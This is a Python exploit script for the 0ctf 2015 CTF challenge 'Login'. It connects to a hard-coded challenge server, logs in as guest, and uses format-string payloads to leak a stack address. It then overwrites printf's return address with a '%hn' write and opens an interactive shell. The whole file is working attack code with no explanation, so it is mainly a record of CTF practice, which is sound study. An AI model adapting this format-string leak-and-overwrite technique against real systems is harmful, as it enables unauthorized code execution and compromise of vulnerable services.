#!/usr/bin/env python
import struct,socket,telnetlib
# 0ctf 2015
# exploit : Login


def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("202.112.28.116",10910))
#s = socket.create_connection(("127.0.0.1",12345))
f = s.makefile('rw',bufsize=0)

f.write("guest\n") # username
f.write("guest123\n") # password

f.write("2\n") # login as user
f.write("\x41" * 255 + "\x00" +  "\n")


f.write("4\n") # secret function
f.write("rootAAAAAAAAAA" + "%lx " * 50 + "\n") # leak  address
f.write("B" * 100 + "\n") # password

msg = read_until("failed.\n")
msg = msg.split(" ")

leak_addr = ""
for index,c in enumerate(msg):
	if "root" in c:
		leak_addr = msg[index+2]
		leak_addr = int(leak_addr,16)
		break

#print "we get stack address " + hex(leak_addr)
stack_base = leak_addr - 0x8
#print "we get printf's return address " + hex(stack_base)

# guess 1 byte or 4bit due to PIE
# ...........xxfb3 -> open_flag offset ( 0xfb3)
payload = "root" + "%95lx" * 24 + "%9927x"  +  "%99hn" + "%x" + "C" * 7 + p(stack_base)+ "A" * 10 + "\n"
f.write(payload)
f.write("B" * 100 + "\n")

shell()
